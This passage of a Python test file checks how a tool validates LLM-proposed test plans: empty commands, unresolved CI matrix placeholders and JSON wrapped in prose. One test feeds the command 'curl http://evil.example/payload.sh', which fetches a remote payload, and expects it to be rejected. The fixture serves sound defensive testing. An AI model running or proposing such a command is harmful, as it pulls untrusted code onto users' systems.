            "session can be honestly grounded in this environment."
        ),
        "confidence": "low",
    }
    payload.update(overrides)
    return json.dumps(payload)


def _urllib3_matrix_shaped_repo(tmp_path: Path) -> Path:
    (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
    (tmp_path / "dev-requirements.txt").write_text("nox\n", encoding="utf-8")
    (tmp_path / "noxfile.py").write_text(
        "import nox\n\n@nox.session(python=['3.9','3.10','3.11','3.12'])\n"
        "def test(session):\n    session.run('pytest', 'test/')\n",
        encoding="utf-8",
    )
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text(
        "jobs:\n  test:\n    strategy:\n      matrix:\n        python-version: ['3.9','3.10','3.11','3.12']\n"
        "    steps:\n      - run: python -m pip install --upgrade pip setuptools nox\n"
        "      - run: nox -s ${NOX_SESSION:-test-$PYTHON_VERSION} --error-on-missing-interpreters\n",
        encoding="utf-8",
    )
    return tmp_path


class TestEmptyTestCommandNoPlanRepresentation:
    """Behavioral coverage for the fix: an empty test_command paired with
    confidence "low" is a clean, explicit "no executable plan" signal,
    handled BEFORE a TestExecutionPlan is ever constructed."""

    def test_empty_command_with_low_confidence_is_rejected_as_insufficient_evidence(self, tmp_path):
        llm = _FakeLLM(_valid_response(test_command=[], result_strategy="exit_code",
                                        result_output_path=None, confidence="low"))
        rejection_reason: "list[str]" = []
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=rejection_reason)
        assert plan is None
        assert rejection_reason and "insufficient evidence" in rejection_reason[0]

    def test_empty_command_with_medium_confidence_is_rejected_not_silently_accepted(self, tmp_path):
        """The other half of the contract: an empty command must NEVER
        slip through just because confidence wasn't reported as "low" --
        this is a distinct, clearly-labeled rejection, not a silent
        pass-through to (and crash inside) TestExecutionPlan/validate_plan."""
        llm = _FakeLLM(_valid_response(test_command=[], result_strategy="exit_code",
                                        result_output_path=None, confidence="medium"))
        rejection_reason: "list[str]" = []
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=rejection_reason)
        assert plan is None
        assert rejection_reason and "confidence" in rejection_reason[0].lower()

    def test_empty_command_with_high_confidence_is_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response(test_command=[], result_strategy="exit_code",
                                        result_output_path=None, confidence="high"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_rejection_reason_distinguishes_insufficient_evidence_from_generic_low_confidence(self, tmp_path):
        """Observability: the two "low confidence" outcomes (empty
        command vs. a real-but-distrusted command) get DIFFERENT
        diagnostic reasons, even though both resolve to the same None."""
        empty_reason: "list[str]" = []
        discover_test_plan(
            _repo_with_evidence(tmp_path),
            _FakeLLM(_valid_response(test_command=[], result_strategy="exit_code",
                                      result_output_path=None, confidence="low")),
            rejection_reason=empty_reason,
        )
        populated_reason: "list[str]" = []
        discover_test_plan(
            _repo_with_evidence(tmp_path),
            _FakeLLM(_valid_response(confidence="low")),
            rejection_reason=populated_reason,
        )
        assert empty_reason != populated_reason
        assert "insufficient evidence" in empty_reason[0]
        assert "self-reported low confidence" in populated_reason[0]

    def test_setup_commands_alongside_empty_test_command_is_still_a_clean_rejection(self, tmp_path):
        """setup_commands "should normally be empty" in a no-plan
        response, but a non-empty one alongside an empty test_command
        must not become fatal or bypass rejection -- it's simply never
        used, since we reject before constructing anything executable."""
        llm = _FakeLLM(_valid_response(
            setup_commands=[["python", "-m", "pip", "install", "-e", "."]],
            test_command=[], result_strategy="exit_code", result_output_path=None, confidence="low",
        ))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_medium_and_high_confidence_still_require_a_real_non_empty_command(self, tmp_path):
        """Required non-regression, explicit: this fix does not weaken
        the requirement that a trusted plan be genuinely executable."""
        for level in ("medium", "high"):
            llm = _FakeLLM(_valid_response(confidence=level))
            plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
            assert plan is not None
            assert len(plan.test_command) > 0

    def test_existing_valid_plans_are_unchanged(self, tmp_path):
        """Required non-regression: a normal, fully-populated, valid
        response is entirely unaffected by this fix."""
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.test_command == ("python", "-m", "pytest", "--junitxml=/tmp/openant-result.xml")
        assert plan.confidence == "high"


class TestUrllib3MatrixPlaceholderRealRunRegression:
    """Direct regression anchor for the real urllib3 CVE-2023-43804 S10
    replay finding."""

    def test_real_observed_payload_with_unresolved_placeholder_is_rejected(self, tmp_path):
        """The EXACT payload the model actually returned -- an unresolved
        CI matrix expression left literally in test_command, confidence
        "low" -- must never become an executable plan. (Caught today by
        TWO independent mechanisms: confidence == "low" short-circuits
        before validate_plan ever runs; if confidence had been anything
        else, test_plan_validation's existing shell-metacharacter check
        would independently reject the literal "$" in the token. Neither
        mechanism is weakened by this fix.)"""
        repo = _urllib3_matrix_shaped_repo(tmp_path)
        llm = _FakeLLM(_urllib3_matrix_placeholder_response())
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_unresolved_placeholder_never_accepted_even_at_higher_confidence(self, tmp_path):
        """Isolates the shell-metacharacter backstop specifically: the
        SAME unresolved placeholder, but with confidence bumped to
        "high" so the low-confidence short-circuit can't be what's
        rejecting it -- must still be rejected."""
        repo = _urllib3_matrix_shaped_repo(tmp_path)
        llm = _FakeLLM(_urllib3_matrix_placeholder_response(confidence="high"))
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_the_fixed_response_shape_is_cleanly_accepted_as_no_plan(self, tmp_path):
        """What the model SHOULD now return instead, per the updated
        prompt contract: an empty test_command (and setup_commands)
        alongside confidence "low" -- explicitly, cleanly rejected as
        "insufficient evidence", never routed through TestExecutionPlan
        construction at all."""
        repo = _urllib3_matrix_shaped_repo(tmp_path)
        llm = _FakeLLM(_urllib3_matrix_placeholder_response(
            setup_commands=[], test_command=[],
            reasoning_summary=(
                "The CI-evidenced session name is parameterized by a build matrix (Python "
                "version); no concrete session can be honestly grounded in this environment, "
                "and no non-parameterized fallback session is evidenced."
            ),
        ))
        rejection_reason: "list[str]" = []
        plan = discover_test_plan(repo, llm, rejection_reason=rejection_reason)
        assert plan is None
        assert rejection_reason and "insufficient evidence" in rejection_reason[0]


class TestProseTolerantJsonExtraction:
    """Formatting-tolerance-only JSON extraction (real urllib3 replay
    finding: an otherwise execution-critical-valid response was rejected
    outright because the model prefaced it with one explanatory prose
    sentence, despite the prompt saying not to). Strict json.loads() is
    still preferred and is the ONLY path for a well-formed response;
    extraction is a narrow fallback, never semantic repair."""

    def test_exact_json_object_still_parses_unchanged(self, tmp_path):
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None

    def test_prose_before_a_valid_json_object_is_accepted(self, tmp_path):
        llm = _FakeLLM(
            "Based on the repository evidence, here is the plan:\n" + _valid_response()
        )
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.test_command == ("python", "-m", "pytest", "--junitxml=/tmp/openant-result.xml")

    def test_prose_after_a_valid_json_object_is_accepted(self, tmp_path):
        llm = _FakeLLM(
            _valid_response() + "\nLet me know if you have any questions about this plan."
        )
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None

    def test_prose_both_before_and_after_is_accepted(self, tmp_path):
        llm = _FakeLLM(
            "Here is my proposed plan:\n" + _valid_response() + "\nHope that helps!"
        )
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None

    def test_fenced_json_with_no_prose_remains_compatible(self, tmp_path):
        """Required non-regression: the pre-existing fence-stripping fast
        path (whole response is exactly one fenced JSON object) is
        unaffected by this fix."""
        llm = _FakeLLM("```json\n" + _valid_response() + "\n```")
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None

    def test_prose_around_a_fenced_json_object_is_also_accepted(self, tmp_path):
        """The extraction fallback is brace-based, not fence-based -- it
        recovers a fenced object even when prose ALSO surrounds the
        fence markers themselves (a combination the pre-existing
        fence-stripping alone cannot handle, since that only strips a
        fence anchored to the very start/end of the whole response)."""
        llm = _FakeLLM(
            "Here is the plan:\n```json\n" + _valid_response() + "\n```\nLet me know if you have questions."
        )
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None

    def test_malformed_json_remains_rejected(self, tmp_path):
        llm = _FakeLLM("This repository uses pytest, but I cannot form a JSON object right now.")
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_unbalanced_braces_with_no_complete_object_remains_rejected(self, tmp_path):
        llm = _FakeLLM("not json at all {{{")
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_two_distinct_json_objects_remain_rejected_as_ambiguous(self, tmp_path):
        """Do NOT silently choose one object if the response contains two
        plausible JSON payloads -- e.g. the model second-guesses itself
        and includes both a draft and a revised plan."""
        llm = _FakeLLM(
            "Draft: " + _valid_response(confidence="low")
            + "\nActually, here is the corrected plan: " + _valid_response(confidence="high")
        )
        rejection_reason: "list[str]" = []
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=rejection_reason)
        assert plan is None
        assert rejection_reason and "more than one" in rejection_reason[0]

    def test_extracted_object_still_enforces_required_fields(self, tmp_path):
        """Extraction does not bypass ANY existing validation -- a
        response missing an execution-critical key, prefaced with prose,
        must still reject on that basis."""
        payload = json.loads(_valid_response())
        del payload["evidence"]
        llm = _FakeLLM("Here is the plan:\n" + json.dumps(payload))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_extracted_object_still_enforces_confidence_contract(self, tmp_path):
        llm = _FakeLLM("Here is the plan:\n" + _valid_response(confidence="extremely-sure"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_extracted_object_still_enforces_execution_safety_validation(self, tmp_path):
        llm = _FakeLLM(
            "Here is the plan:\n" + _valid_response(test_command=["curl", "http://evil.example/payload.sh"])
        )
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_prose_containing_an_unrelated_brace_that_is_not_valid_json_is_ignored(self, tmp_path):
        """A stray "{" in ordinary prose (never balanced/valid JSON on
        its own) must not be mistaken for a second candidate."""
        llm = _FakeLLM(
            _valid_response() + "\nNote: options are configured via a {config} block in some tools."
        )
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None

    def test_real_urllib3_prose_prefixed_response_is_now_accepted(self, tmp_path):
        """Direct regression anchor: the exact real urllib3 S10 replay
        finding -- a semantically-correct, medium-confidence plan
        (repository-grounded, non-parameterized nox session) rejected
        outright because of one explanatory sentence before the JSON."""
        repo = _urllib3_matrix_shaped_repo(tmp_path)
        prose_prefixed = (
            "The CI invocation is parameterized by a build matrix, so I selected the "
            "repository-defined non-parameterized nox session instead.\n"
            + json.dumps({
                "setup_commands": [["python", "-m", "pip", "install", "--upgrade", "pip", "setuptools", "nox"]],
                "test_command": ["nox", "-s", "test"],
                "result_strategy": "exit_code",
                "result_output_path": None,
                "runtime_family": "python",
                "runtime_version_hint": None,
                "evidence": ["noxfile.py", ".github/workflows/ci.yml", "pyproject.toml", "dev-requirements.txt"],
                "reasoning_summary": (
                    "noxfile.py defines a non-parameterized 'test' session; the CI-evidenced "
                    "invocation is matrix-parameterized and was not used directly."
                ),
                "confidence": "medium",
            })
        )
        llm = _FakeLLM(prose_prefixed)
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        assert plan.test_command == ("nox", "-s", "test")
        assert plan.confidence == "medium"
